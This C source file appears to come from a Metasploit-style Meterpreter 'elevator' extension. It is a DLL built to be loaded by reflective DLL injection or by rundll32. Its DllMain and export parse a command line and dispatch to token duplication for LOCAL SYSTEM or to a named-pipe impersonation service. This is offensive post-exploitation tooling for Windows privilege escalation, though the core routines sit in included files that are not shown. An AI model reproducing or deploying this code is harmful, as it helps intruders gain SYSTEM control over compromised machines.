//
// Note: To use the produced x86 dll on NT4 you must manually edit the PE Header (CFF Explorer[1] is good) in order
//       to change the MajorOperatingSystemVersion and MajorSubsystemVersion to 4 instead of 5 as Visual C++ 2008
//       can't build PE images for NT4 (only 2000 and up). The modified dll will then work on NT4 and up. This does
//       not apply to the produced x64 dll.
//
// [1] http://www.ntcore.com/exsuite.php
//
#include "elevator.h"
#include "namedpipeservice.h"
#include "tokendup.h"

// define this as we are going to be injected via LoadRemoteLibraryR
#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR

// define this as we want to use our own DllMain function
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/ReflectiveLoader.c"

/*
 * The real entrypoint for this app.
 */
VOID elevator_main( char * cpCommandLine )
{
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		dprintf( "[ELEVATOR] elevator_main. cpCommandLine=0x%08X", (DWORD)cpCommandLine );

		if( !cpCommandLine )
			break;

		if( strlen( cpCommandLine ) == 0 )
			break;
			
		dprintf( "[ELEVATOR] elevator_main. lpCmdLine=%s", cpCommandLine );
		
		if( strstr( cpCommandLine, "/t:" ) )
		{
			DWORD dwThreadId = 0;

			cpCommandLine += strlen( "/t:" );

			dwThreadId = atoi( cpCommandLine );

			dwResult = elevator_tokendup( dwThreadId, SECURITY_LOCAL_SYSTEM_RID );

			ExitThread( dwResult );
		}
		else if( strstr( cpCommandLine, "/p:" ) )
		{
			cpCommandLine += strlen( "/p:" );

			dwResult = elevator_namedpipeservice( cpCommandLine );
		}

	} while( 0 );
}

/*
 * rundll32.exe entry point.
 */
VOID DLLEXPORT CALLBACK a( HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int nCmdShow )
{
	elevator_main( lpszCmdLine );

	ExitProcess( ERROR_SUCCESS );
}

/*
 * DLL entry point. If we have been injected via RDI, lpReserved will be our command line.
 */
BOOL WINAPI DllMain( HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;

	switch( dwReason ) 
    { 
		case DLL_PROCESS_ATTACH:
			hAppInstance = hInstance;
			if( lpReserved != NULL )
				elevator_main( (char *)lpReserved );
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }

	return bReturnValue;
}

